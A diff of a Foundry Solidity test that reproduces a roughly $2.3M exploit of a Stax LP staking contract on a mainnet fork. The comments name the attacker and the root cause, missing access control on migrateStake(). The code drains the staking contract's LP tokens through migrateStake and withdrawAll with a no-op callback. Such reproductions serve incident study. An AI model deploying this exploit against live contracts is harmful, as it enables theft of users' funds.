@@ -2,8 +2,8 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
+import {IERC20} from "OpenZeppelin/interfaces/IERC20.sol";
 // @KeyInfo - Total Lost : $~2.3M
 // Attacker : 0x9c9fb3100a2a521985f0c47de3b4598dafd25b01
 // Attack Contract : https://etherscan.io/address/0x2df9c154fe24d081cfe568645fb4075d725431e0
@@ -21,16 +21,15 @@ import "./../interface.sol";
 // Root cause: Insufficient access control of the `migrateStake()` function.
 
 interface IStaxLPStaking {
-
     function migrateStake(address oldStaking, uint256 amount) external;
     function withdrawAll(bool claim) external;
-
 }
 
 contract ContractTest is Test {
-
-    IERC20 constant xFraxTempleLP = IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);
-    IStaxLPStaking constant StaxLPStaking = IStaxLPStaking(0xd2869042E12a3506100af1D192b5b04D65137941);
+    IERC20 constant xFraxTempleLP =
+        IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);
+    IStaxLPStaking constant StaxLPStaking =
+        IStaxLPStaking(0xd2869042E12a3506100af1D192b5b04D65137941);
 
     function setUp() public {
         vm.createSelectFork("mainnet", 15_725_066);
@@ -41,7 +40,9 @@ contract ContractTest is Test {
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "[Start] Attacker xFraxTempleLP balance before exploit", xFraxTempleLP.balanceOf(address(this)), 18
+            "[Start] Attacker xFraxTempleLP balance before exploit",
+            xFraxTempleLP.balanceOf(address(this)),
+            18
         );
 
         uint256 lpbalance = xFraxTempleLP.balanceOf(address(StaxLPStaking));
@@ -53,15 +54,14 @@ contract ContractTest is Test {
         StaxLPStaking.withdrawAll(false);
 
         emit log_named_decimal_uint(
-            "[End] Attacker xFraxTempleLP balance after exploit", xFraxTempleLP.balanceOf(address(this)), 18
+            "[End] Attacker xFraxTempleLP balance after exploit",
+            xFraxTempleLP.balanceOf(address(this)),
+            18
         );
     }
 
     function migrateWithdraw(
         address,
-        uint256
-    )
-        public //callback
-    {}
-
+        uint256 //callback
+    ) public {}
 }
